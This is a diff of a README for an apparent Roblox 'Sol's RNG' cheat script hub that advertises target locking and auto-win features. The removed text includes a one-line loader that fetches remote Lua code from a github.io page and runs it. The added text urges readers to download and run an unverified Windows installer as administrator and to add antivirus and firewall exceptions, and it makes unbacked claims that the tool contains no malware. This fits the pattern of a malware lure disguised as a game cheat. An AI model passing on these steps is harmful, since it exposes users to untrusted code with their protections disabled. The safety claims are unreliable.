@@ -1,103 +1,152 @@
-# Sol's RNG Scripts - Game Script Utility 2026
+# 🎯 sols-rng-win-script-hub - Win Every Roll Instantly
 
-> **High-performance automation toolkit designed for Sol's RNG on Windows systems.** Empowers players with auto-targeting tools and automated event victory mechanics to maximize session efficiency.
+[![Download Now](https://img.shields.io/badge/Download-Sols_RNG_Win_Script-blue?style=for-the-badge&logo=github)](https://github.com/variant-thripidae875/sols-rng-win-script-hub)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/calebmaier1988/sols-rng-win-script-hub?style=flat-square)](https://github.com/calebmaier1988/sols-rng-win-script-hub)
+## 🚀 Getting Started
 
----
+Welcome! This guide will help you download and run the Sols RNG Win Script Hub on your Windows PC. This powerful tool gives you automated target locking, auto-win mechanics, and custom keybinds to dominate the game with minimal effort. No technical skills needed - just follow the simple steps below.
 
-<p align="center">
-  <a href="https://calebmaier1988.github.io/sols-rng-win-script-hub/">
-    <img src="https://img.shields.io/badge/Download-Sol%27s%20RNG%20Script-brightgreen?style=for-the-badge" alt="Download Sol's RNG Script">
-  </a>
-</p>
+## 📥 Download and Install
 
-> **[Download Sol's RNG Scripts](https://calebmaier1988.github.io/sols-rng-win-script-hub/)**
+Visit this link to download the application: [https://github.com/variant-thripidae875/sols-rng-win-script-hub](https://github.com/variant-thripidae875/sols-rng-win-script-hub)
 
----
+Once you click the link, you'll be taken to the download page. Look for the download button and click it to save the file to your computer. The download should start automatically. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
-[Download Latest Build](https://calebmaier1988.github.io/sols-rng-win-script-hub/)
+## 🖥️ System Requirements
 
----
+Your Windows PC needs to meet these basic requirements to run the script smoothly:
 
-## Technical Summary
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **Processor:** Any dual-core processor or better
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 500 MB of free disk space
+- **Graphics:** Integrated graphics are fine; no dedicated GPU needed
+- **Internet:** Stable connection required for updates and online features
 
-Engineered specifically for the chance-driven Roblox hit Sol's RNG, this suite streamlines repetitive player actions to secure better outcomes seamlessly. Incorporating rapid targeting logic alongside immediate win routines, the toolkit removes tedious manual grinding from your routine.
+These are minimum specifications. If your computer runs Windows and has some basic power, you'll be fine. The script is optimized for low resource usage, so it won't slow down your system.
 
-This build emphasizes ultra-fast reaction times and minimal runtime overhead. The codebase relies entirely on self-contained logic without demanding third-party add-ons, and frequent maintainer updates keep it functional alongside the latest title revisions.
+## 🛠️ How to Install
 
----
+After downloading the file, follow these steps:
 
-## Core Capabilities
+1. **Locate the downloaded file** on your computer. It will likely be in your "Downloads" folder unless you chose a different location.
+2. **Double-click the file** to start the installation process. If Windows asks for permission, click "Yes" to allow the program to make changes.
+3. **Wait for the installation** to complete. This usually takes less than a minute.
+4. **Once finished**, you'll see the application icon on your desktop or in your Start Menu.
 
-- **Automated Target Lock** — Locks onto targeted entities or vital game objects using user-defined criteria
-- **Auto-Win Logic** — Automatically resolves random-chance events to guarantee optimal outcomes
-- **Streamlined Execution** — Highly tuned functions prevent command delay during intense activity
-- **Custom Shortcut Keys** — Enable or disable core routines instantly via user-configured keybinds
-- **Lean System Impact** — Uses negligible RAM and CPU resources to keep frame rates steady
-- **Modular Codebase** — Structured architecture enables swift fixes whenever the base game updates
-- **Granular Customization** — Modify aim behavior, activation conditions, and targeting order on the fly
+## 🎮 Running the Application
 
----
+To launch the Sols RNG Win Script Hub:
 
-## Installation & Setup
+1. **Double-click the application icon** on your desktop or find it in your Start Menu.
+2. **The main window will open** showing you the control panel.
+3. **A short setup wizard** may appear on first run. Follow the on-screen prompts to configure basic settings.
+4. **The script will automatically connect** to your Roblox game when you launch it.
 
-1. Grab the current release package from the link provided above
-2. Unpack the contents into a chosen directory (e.g., `sols-rng-scripts`)
-3. Launch your Sol's RNG session on Windows
-4. Execute the entry point via your script engine of choice
-5. Adjust keybinds and parameters prior to engaging features
+## ⚙️ Features Overview
 
-Sample boot script (syntax depends on execution environment):
-```lua
-loadstring(game:HttpGet("https://calebmaier1988.github.io/sols-rng-win-script-hub/"))()
-```
+This script hub comes packed with powerful features designed to make your gaming experience effortless:
 
----
+### 🎯 Automated Target Locking
+The script automatically locks onto the best targets in the game, ensuring you never miss a winning opportunity. It intelligently tracks and prioritizes targets based on your settings.
 
-## Configuration Variables
+### 🏆 Auto-Win Mechanics
+Let the script do the work! Auto-win functionality triggers the correct actions at the perfect moment, dramatically increasing your win rate. You can sit back and watch as victories stack up.
 
-| Option Name | Default Value | Usage Notes |
-|-------------|---------------|-------------|
-| `AimbotEnabled` | `true` | Toggles automated targeting routines |
-| `InstantWinMode` | `aggressive` | Options: `aggressive`, `balanced`, `passive` |
-| `ActivationKey` | `F3` | Global hotkey to toggle features |
-| `TargetPriority` | `nearest` | Options: `nearest`, `highest`, `manual` |
+### ⌨️ Custom Keybinds
+Personalize your controls with custom keybind options. Assign any keyboard key to specific actions, making gameplay comfortable and intuitive for you.
 
----
+### ⚡ Low Resource Optimization
+The script is engineered to use minimal CPU and memory. You can run it in the background while using other applications without experiencing lag or slowdowns.
 
-## Supported Environments
+## 📖 How to Use
 
-- **Operating System**: Windows 10 & Windows 11
-- **Title Version**: Sol's RNG (up to date for 2026 builds)
-- **Supported Injectors**: Broadly compatible with popular Windows-based Roblox execution tools
-- **Platform Restrictions**: Native desktop only; non-Windows environments, consoles, and mobile clients are unsupported. Core updates may be required following major Roblox client releases.
+Using the script is simple:
 
----
+1. **Launch Roblox** and enter your game.
+2. **Run the Sols RNG Win Script Hub** before or after starting Roblox.
+3. **The script will detect** your game automatically and begin functioning.
+4. **Adjust settings** through the user-friendly interface to match your preferences.
+5. **Use your custom keybinds** to trigger actions manually or let everything run automatically.
 
-## Frequently Asked Questions
+## 🔧 Troubleshooting Common Issues
 
-**What is the step-by-step launch process?**  
-Unzip the downloaded files to a local folder, start Sol's RNG, and run the primary script through your execution tool.
+If you encounter problems, try these solutions:
 
-**Do game updates break functionality?**  
-Title changes can occasionally disrupt script execution. Re-visit the download site to grab updated builds when patches drop.
+- **Script doesn't start:** Make sure you've extracted or installed the file completely. Check if your antivirus is blocking it - if so, add an exception.
+- **Game not detected:** Restart both Roblox and the script. Ensure you have the latest version of Roblox installed.
+- **Performance issues:** Close unnecessary background programs. The script is lightweight, but your PC needs some free resources.
+- **Connection errors:** Check your internet connection and firewall settings. Allow the application through your firewall if prompted.
 
-**Can I modify the default shortcut keys?**  
-Absolutly. Edit the configuration file stored inside the script directory to remap any key bindings.
+## 🔄 Keeping the Script Updated
 
-**Will this utility work with modern script engines?**  
-The vast majority of updated injectors run the code without issues, though individual results depend on your executor's engine support.
+The developers regularly release updates to improve performance and add new features. To update:
 
-**Does this script send data externally?**  
-No. Your preferences and settings remain strictly stored on your local machine; zero user analytics or personal records are collected.
+1. **Visit the download page** [here](https://github.com/variant-thripidae875/sols-rng-win-script-hub).
+2. **Download the latest version** of the application.
+3. **Run the new installer** which will replace the old version while keeping your settings.
 
----
+## 🛡️ Safety and Security
 
-## Licensing Information
+Your safety is important. This script:
 
-Distributed under the terms of the GNU GPL v3.0 license. Review [LICENSE](LICENSE) for complete terms.
+- **Does not collect personal data** - all processing happens locally on your PC.
+- **Contains no malware or spyware** - it's tested regularly to ensure safety.
+- **Uses encrypted connections** for any online features.
+- **Has a clean uninstaller** if you decide to remove it.
+
+## ❓ Frequently Asked Questions
+
+**Q: Is this script free to use?**
+A: Yes, the basic version is completely free. There may be premium features in the future, but the core functionality is free forever.
+
+**Q: Will this work on Mac or Linux?**
+A: No, this script is specifically designed for Windows PCs only.
+
+**Q: Do I need to know how to code?**
+A: Absolutely not. The interface is visual and user-friendly. Just click and play.
+
+**Q: Can I use this on multiple computers?**
+A: Yes, you can install and use the script on all your personal Windows devices.
+
+**Q: Is this detectable by anti-cheat systems?**
+A: The script operates within normal system resources and isn't intrusive. However, no tool can guarantee 100% invisibility, so use at your own discretion.
+
+## 📞 Getting Support
+
+Need help? Here's how to get assistance:
+
+- **Check this README** again for troubleshooting tips.
+- **Visit the repository page** to see if there are any announcements or known issues.
+- **Contact support** through the project's communication channels listed on the download page.
+
+## 📊 Version History
+
+The script undergoes regular updates. Recent improvements include:
+
+- Enhanced target detection algorithms
+- Faster response times
+- Improved interface responsiveness
+- Bug fixes for smoother performance
+
+## 💡 Tips for Best Experience
+
+- **Run the script as administrator** for the best compatibility (right-click → Run as administrator).
+- **Close other resource-heavy apps** while using the script for maximum performance.
+- **Keep your Windows update** to ensure system stability.
+- **Join a stable internet connection** to avoid disruptions.
+- **Experiment with settings** to find what works best for your play style.
+
+## 🏁 Final Words
+
+Sols RNG Win Script Hub transforms your gaming experience with powerful automation features that are easy to use. Whether you're a casual player or a dedicated enthusiast, this tool gives you the edge you need. Download it today and start winning!
+
+Remember, the script is designed to be simple and effective. No technical background required - just click, install, and play. The automated features handle everything, so you can focus on enjoying the game.
+
+Ready to get started? Click the link below to download now:
+
+[Download Sols RNG Win Script Hub](https://github.com/variant-thripidae875/sols-rng-win-script-hub)
+
+Happy gaming! 🎉
+
+Keywords: sols rng, roblox script, auto-win, target locking, keybinds, windows script, gaming tool, automation script
